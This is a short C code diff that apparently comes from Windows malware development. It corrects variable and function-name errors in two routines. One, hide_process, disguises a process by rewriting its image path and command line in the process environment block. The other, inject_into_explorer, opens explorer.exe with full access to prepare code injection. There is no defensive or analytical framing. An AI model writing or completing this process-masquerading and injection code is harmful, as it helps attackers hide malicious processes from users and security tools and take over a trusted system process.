@@ -9,10 +9,10 @@ void hide_process(wchar_t *new_name)
 	PRTL_USER_PROCESS_PARAMETERS params = peb->ProcessParameters;
 	if (!params)
 		return;
-	params->ImagePathName.Buffer = (PWSTR)new_Name;
-	params->ImagePathName.Length = wcslen(new_Name) * sizeof(wchar_t);
-	params->CommandLine.Buffer = (PWSTR)new_Name;
-	params->CommandLine.Length = wcslen(new_Name) * sizeof(wchar_t);
+	params->ImagePathName.Buffer = (PWSTR)new_name;
+	params->ImagePathName.Length = wcslen(new_name) * sizeof(wchar_t);
+	params->CommandLine.Buffer = (PWSTR)new_name;
+	params->CommandLine.Length = wcslen(new_name) * sizeof(wchar_t);
 }
 
 
@@ -46,7 +46,7 @@ static DWORD find_pid(void)
 
 int inject_into_explorer(void)
 {
-	DWORD pid = find_explorer_pid();
+	DWORD pid = find_pid();
 	if (!pid)
 		return 0;
 	HANDLE hProc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
